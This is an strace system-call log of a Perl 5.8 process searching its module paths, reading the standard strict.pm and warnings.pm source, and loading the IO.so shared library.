12710 07:43:45.410152 stat64("/usr/lib/perl5/strict.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.410165 stat64("/usr/share/perl5/strict.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.410176 stat64("/usr/share/perl5/strict.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.410194 stat64("/usr/lib/perl/5.8/strict.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.410206 stat64("/usr/lib/perl/5.8/strict.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.410220 stat64("/usr/share/perl/5.8/strict.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.410232 stat64("/usr/share/perl/5.8/strict.pm", {st_mode=S_IFREG|0644, st_size=599, ...}) = 0
12710 07:43:45.410253 open("/usr/share/perl/5.8/strict.pm", O_RDONLY|O_LARGEFILE) = 8
12710 07:43:45.410267 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8ee6b8) = -1 ENOTTY (Inappropriate ioctl for device)
12710 07:43:45.410279 _llseek(8, 0, [0], SEEK_CUR) = 0
12710 07:43:45.410297 read(8, "package strict;\n\n$strict::VERSION = \"1.03\";\n\nmy %bitmask = (\nrefs => 0x00000002,\nsubs => 0x00000200,\nvars => 0x00000400\n);\n\nsub bits {\n    my $bits = 0;\n    my @wrong;\n    foreach my $s (@_) {\n\tpush @wrong, $s unless exists $bitmask{$s};\n        $bits |= $bitmask{$s} || 0;\n    }\n    if (@wrong) {\n        require Carp;\n        Carp::croak(\"Unknown \'strict\' tag(s) \'@wrong\'\");\n    }\n    $bits;\n}\n\nmy $default_bits = bits(qw(refs subs vars));\n\nsub import {\n    shift;\n    $^H |= @_ ? bits(@_) : $default_bits;\n}\n\nsub unimport {\n    shift;\n    $^H &= ~ (@_ ? bits(@_) : $default_bits);\n}\n\n1;\n__END__\n\n", 4096) = 599
12710 07:43:45.410495 _llseek(8, 598, [598], SEEK_SET) = 0
12710 07:43:45.410510 _llseek(8, 0, [598], SEEK_CUR) = 0
12710 07:43:45.410520 close(8)          = 0
12710 07:43:45.410557 stat64("/etc/perl/warnings.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.410572 stat64("/etc/perl/warnings.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.410585 stat64("/usr/local/lib/perl/5.8.8/warnings.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.410598 stat64("/usr/local/lib/perl/5.8.8/warnings.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.410612 stat64("/usr/local/share/perl/5.8.8/warnings.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.410624 stat64("/usr/local/share/perl/5.8.8/warnings.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.410638 stat64("/usr/lib/perl5/warnings.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.410650 stat64("/usr/lib/perl5/warnings.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.410663 stat64("/usr/share/perl5/warnings.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.410675 stat64("/usr/share/perl5/warnings.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.410688 stat64("/usr/lib/perl/5.8/warnings.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.410700 stat64("/usr/lib/perl/5.8/warnings.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.410714 stat64("/usr/share/perl/5.8/warnings.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.410726 stat64("/usr/share/perl/5.8/warnings.pm", {st_mode=S_IFREG|0644, st_size=13018, ...}) = 0
12710 07:43:45.410747 open("/usr/share/perl/5.8/warnings.pm", O_RDONLY|O_LARGEFILE) = 8
12710 07:43:45.410761 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8ee6b8) = -1 ENOTTY (Inappropriate ioctl for device)
12710 07:43:45.410772 _llseek(8, 0, [0], SEEK_CUR) = 0
12710 07:43:45.410790 read(8, "# -*- buffer-read-only: t -*-\n# !!!!!!!   DO NOT EDIT THIS FILE   !!!!!!!\n# This file was created by warnings.pl\n# Any changes made here will be lost.\n#\n\npackage warnings;\n\nour $VERSION = \'1.05\';\n\nuse Carp ();\n\nour %Offsets = (\n\n    # Warnings Categories added in Perl 5.008\n\n    \'all\'\t\t=> 0,\n    \'closure\'\t\t=> 2,\n    \'deprecated\'\t=> 4,\n    \'exiting\'\t\t=> 6,\n    \'glob\'\t\t=> 8,\n    \'io\'\t\t=> 10,\n    \'closed\'\t\t=> 12,\n    \'exec\'\t\t=> 14,\n    \'layer\'\t\t=> 16,\n    \'newline\'\t\t=> 18,\n    \'pipe\'\t\t=> 20,\n    \'unopened\'\t\t=> 22,\n    \'misc\'\t\t=> 24,\n    \'numeric\'\t\t=> 26,\n    \'once\'\t\t=> 28,\n    \'overflow\'\t\t=> 30,\n    \'pack\'\t\t=> 32,\n    \'portable\'\t\t=> 34,\n    \'recursion\'\t\t=> 36,\n    \'redefine\'\t\t=> 38,\n    \'regexp\'\t\t=> 40,\n    \'severe\'\t\t=> 42,\n    \'debugging\'\t\t=> 44,\n    \'inplace\'\t\t=> 46,\n    \'internal\'\t\t=> 48,\n    \'malloc\'\t\t=> 50,\n    \'signal\'\t\t=> 52,\n    \'substr\'\t\t=> 54,\n    \'syntax\'\t\t=> 56,\n    \'ambiguous\'\t\t=> 58,\n    \'bareword\'\t\t=> 60,\n    \'digit\'\t\t=> 62,\n    \'parenthesis\'\t=> 64,\n    \'precedence\'\t=> 66,\n    \'printf\'\t\t=> 68,\n    \'prototype\'\t\t=> 70,\n    \'qw\'\t\t=> 72,\n    \'reserved\'\t\t=> 74,\n    \'semicolon\'\t\t=> 76,\n    \'taint\'\t\t=> 78,\n    \'threads\'\t\t=> 80,\n    \'uninitialized\'\t=> 82,\n    \'unpack\'\t\t=> 84,\n    \'untie\'\t\t=> 86,\n    \'utf8\'\t\t=> 88,\n    \'void\'\t\t=> 90,\n    \'y2k\'\t\t=> 92,\n  );\n\nour %Bits = (\n    \'all\'\t\t=> \"\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x15\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\x54\\x55\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x54\\x05\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x40", 4096) = 4096
12710 07:43:45.411230 brk(0x81b6000)    = 0x81b6000
12710 07:43:45.411246 brk(0x81b5000)    = 0x81b5000
12710 07:43:45.411325 read(8, "\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x55\\x55\\x15\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\", # [46]\n  );\n\nour %DeadBits = (\n    \'all\'\t\t=> \"\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\x2a\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\xa8\\xaa\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\xa8\\x0a\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xaa\\xaa\\x2a\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\", 4096) = 4096
12710 07:43:45.411773 read(8, "x00\\x20\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\", # [46]\n  );\n\n$NONE     = \"\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\";\n$LAST_BIT = 94 ;\n$BYTES    = 12 ;\n\n$All = \"\" ; vec($All, $Offsets{\'all\'}, 2) = 3 ;\n\nsub Croaker\n{\n    local $Carp::CarpInternal{\'warnings\'};\n    delete $Carp::CarpInternal{\'warnings\'};\n    Carp::croak(@_);\n}\n\nsub bits\n{\n    # called from B::Deparse.pm\n\n    push @_, \'all\' unless @_;\n\n    my $mask;\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    return $mask ;\n}\n\nsub import \n{\n    shift;\n\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n    \n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nsub unimport \n{\n    shift;\n\n    my $catmask ;\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n\n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    next; \n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask &= ~($catmask | $DeadBits{$word} | $All);\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nmy %builtin_type; @builtin_type{qw(SCALAR ARRAY HASH CODE REF GLOB LVALUE Regexp)} = ();\n\nsub __chk\n{\n    my $category ;\n    my $offset ;\n    my $isobj = 0 ;\n\n    if (@_) {\n        # check the category supplied.\n        $category = shift ;\n        if (my $type = ref $category) {\n            Croaker(\"not an object\")\n                if exists $builtin_type{$type};\n\t    $category = $type;\n            $isobj = 1 ;\n        }\n        $offset = $Offsets{$category};\n        Croaker(\"Unknown warnings category \'$category\'\")\n\t    unless defined $offset;\n    }\n    else {\n        $category = (caller(1))[0] ;\n        $offset = $Offsets{$category};\n        Croaker(\"package \'$category\' not registered for warnings\")\n\t    unless defined $offset ;\n    }\n\n    my $this_pkg = (caller(1))[0] ;\n    my $i = 2 ;\n    my $pkg ;\n\n    if ($isobj) {\n        while (do { { package DB; $pkg = (caller($i++))[0] } } ) {\n            last unless @DB::args && $DB::args[0] =~ /^$category=/ ;\n        }\n\t$i -= 2 ;\n    }\n    else {\n        for ($i = 2 ; $pkg = (caller($i))[0] ; ++ $i) {\n            last if $pkg ne $this_pkg ;\n        }\n        $i = 2\n            if !$pkg || $pkg eq $this_pkg ;\n    }\n\n    my $callers_bitmask = (caller($i))[9] ;\n    return ($callers_bitmask, $offset, $i) ;\n}\n\nsub enabled\n{\n    Croaker(\"Usage: warnings::enabled([category])\")\n\tunless @_ == 1 || @_ == 0 ;\n\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return 0 unless defined $callers_bitmask ;\n    return vec($callers_bitmask, $offset, 1) ||\n           vec($callers_bitmask, $Offsets{\'all\'}, 1) ;\n}\n\nsub warn\n{\n    Croaker(\"Usage: warnings::warn([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $me", 4096) = 4096
12710 07:43:45.413187 read(8, "ssage = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n    Carp::carp($message) ;\n}\n\nsub warnif\n{\n    Croaker(\"Usage: warnings::warnif([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $message = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return\n        unless defined $callers_bitmask &&\n            \t(vec($callers_bitmask, $offset, 1) ||\n            \tvec($callers_bitmask, $Offsets{\'all\'}, 1)) ;\n\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n\n    Carp::carp($message) ;\n}\n\n1;\n# ex: set ro:\n", 4096) = 730
12710 07:43:45.413317 read(8, "", 4096) = 0
12710 07:43:45.413330 close(8)          = 0
12710 07:43:45.413480 _llseek(6, 412, [412], SEEK_SET) = 0
12710 07:43:45.413495 _llseek(6, 0, [412], SEEK_CUR) = 0
12710 07:43:45.413506 close(6)          = 0
12710 07:43:45.413598 stat64("/usr/lib/perl/5.8/auto/IO/IO.so", {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
12710 07:43:45.413654 stat64("/usr/lib/perl/5.8/auto/IO/IO.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
12710 07:43:45.413682 futex(0xb7fc9070, 0x81 /* FUTEX_??? */, 2147483647) = 0
12710 07:43:45.413698 open("/usr/lib/perl/5.8/auto/IO/IO.so", O_RDONLY) = 6
12710 07:43:45.413711 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\22\0\0004\0\0\0\0349\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\2006\0\0\2006\0\0\5\0\0\0\0\20\0\0\1\0\0\0\2006\0\0\200F\0\0\200F\0\0\360\1\0\0\364\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\2246\0\0\224F\0\0\224F\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0C\0\0\0E\0\0\0\0\0\0\0\t\0\0\0\3\0\0\0D\0\0\0\"\0\0\0009\0\0\0\0\0\0\0#\0\0\0\0\0\0\0%\0\0\0:\0\0\0\4\0\0\0001\0\0\0\37\0\0\0;\0\0\0\30\0\0\0+\0\0\0\23\0\0\0\n\0\0\0000\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\16\0\0\0\0\0\0\0004\0\0\0\0\0\0\0\0\0\0\0008\0\0\0\32\0\0\0\0\0\0\0\0\0\0\0?\0\0\0)\0\0\0\10\0\0\0.\0\0\0\26\0\0\0!\0\0\0\21\0\0\0(\0\0\0&\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0\0\0\0\0\0\0\0\0$\0\0\0006\0\0\0\24\0\0\0A\0\0\0\0\0\0\0\27\0\0\0@\0\0\0\0\0\0\0\5\0\0\0\0\0\0\0\0\0\0\0\33\0\0\0\17\0\0\0002\0\0\0\22\0\0\0>\0\0\0\'\0\0\0\36\0\0\0*\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\7\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
12710 07:43:45.413802 fstat64(6, {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
12710 07:43:45.413827 mmap2(NULL, 18548, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7fcd000
12710 07:43:45.413840 mmap2(0xb7fd1000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x3) = 0xb7fd1000
12710 07:43:45.413856 close(6)          = 0
12710 07:43:45.413982 stat64("/etc/perl/IO/Handle.pmc", 0xbf8eee4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.413998 stat64("/etc/perl/IO/Handle.pm", 0xbf8eed5c) = -1 ENOENT (No such file or directory)
12710 07:43:45.414012 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pmc", 0xbf8eee4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.414025 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pm", 0xbf8eed5c) = -1 ENOENT (No such file or directory)
12710 07:43:45.414065 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pmc", 0xbf8eee4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.414116 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pm", 0xbf8eed5c) = -1 ENOENT (No such file or directory)
